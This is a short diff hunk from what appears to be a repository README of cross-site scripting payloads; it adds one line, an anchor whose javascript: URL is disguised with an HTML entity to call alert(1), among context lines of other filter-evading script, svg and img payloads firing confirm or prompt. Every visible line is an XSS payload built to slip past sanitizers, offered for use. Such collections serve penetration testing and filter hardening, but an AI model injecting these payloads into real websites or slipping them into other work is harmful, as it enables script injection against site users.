@@ -39,6 +39,7 @@ Put this repo on watch. I will be updating it regularly.
 <script y="><">/*<script* */prompt()</script
 <w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
 <a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
 <script/"<a"/src=data:=".<a,[8].some(confirm)>
 <svg/x=">"/onload=confirm()//
 <--`<img/src=` onerror=confirm``> --!>
